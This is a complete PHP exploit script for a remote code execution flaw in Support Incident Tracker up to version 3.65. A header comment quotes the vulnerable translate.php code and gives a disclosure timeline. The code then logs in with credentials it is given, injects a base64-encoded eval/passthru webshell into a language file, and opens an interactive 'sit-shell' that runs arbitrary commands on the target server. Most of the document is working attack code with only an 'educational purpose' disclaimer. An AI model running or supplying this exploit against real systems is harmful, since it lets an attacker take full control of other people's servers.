<?php
 
/*
    ------------------------------------------------------------------------------
    Support Incident Tracker <= 3.65 (translate.php) Remote Code Execution Exploit
    ------------------------------------------------------------------------------
     
    author...............: Egidio Romano aka EgiX
    mail.................: n0b0d13s[at]gmail[dot]com
    software link........: http://sitracker.org/
    affected versions....: from 3.45 to 3.65
     
    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
     
    [-] vulnerable code in /translate.php
     
    234.        foreach (array_keys($_POST) as $key)
    235.        {
    236.            if (!empty($_POST[$key]) AND substr($key, 0, 3) == "str")
    237.            {
    238.                if ($lastchar!='' AND substr($key, 3, 1) != $lastchar) $i18nfile .= "\n";
    239.                $i18nfile .= "\${$key} = '".addslashes($_POST[$key])."';\n";
    240.                $lastchar = substr($key, 3, 1);
    241.                $translatedcount++;
    242.            }
    243.        }
     
    Input passed via keys of $_POST array isn't properly sanitized before being stored into $i18nfile variable
    at line 239, that variable will be the contents of a language file stored into 'i18n' directory with a php
    extension. This could allow authenticated users to inject and execute arbitrary PHP code. Furthermore,
    access directly to /translate.php?mode=save will reveal the full installation path of the application.
 
    [-] Disclosure timeline:
     
    [13/11/2011] - Vulnerability discovered
    [13/11/2011] - Issue reported to http://bugs.sitracker.org/view.php?id=1737
    [13/11/2011] - Vendor replied that this issue is fixed in the current SVN trunk
    [19/11/2011] - Public disclosure
 
*/
 
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
 
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die( "\n[-] No response from {$host}:80\n");
     
    fwrite($sock, $packet);
    return stream_get_contents($sock);
}
 
print "\n+------------------------------------------------------------------------+";
print "\n| Support Incident Tracker <= 3.65 Remote Code Execution Exploit by EgiX |";
print "\n+------------------------------------------------------------------------+\n";
 
if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path> <username> <password>\n";
    print "\nExample....: php $argv[0] localhost / user pass";
    print "\nExample....: php $argv[0] localhost /sit/ user pass\n";
    die();
}
 
$host = $argv[1];
$path = $argv[2];
 
$payload = "username={$argv[3]}&password={$argv[4]}";
$packet  = "POST {$path}login.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: SiTsessionID=foo\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
  
$response = http_send($host, $packet);
 
if (!preg_match("/main.php/", $response)) die("\n[-] Login failed!\n");
if (!preg_match("/Set-Cookie: ([^;]*);/", $response, $sid)) die("\n[-] Session ID not found!\n");
 
$phpcode = base64_encode('passthru(base64_decode($_SERVER[HTTP_CMD]));print("___");');
$payload = "mode=save&lang=sh&str;eval(base64_decode({$phpcode}));//=1";
 
$packet  = "POST {$path}translate.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: {$sid[1]}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
     
http_send($host, $packet);
 
$packet  = "GET {$path}i18n/sh.inc.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
 
while(1)
{
    print "\nsit-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
    preg_match("/\n\r\n(.*)___/s", $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}
 
?>

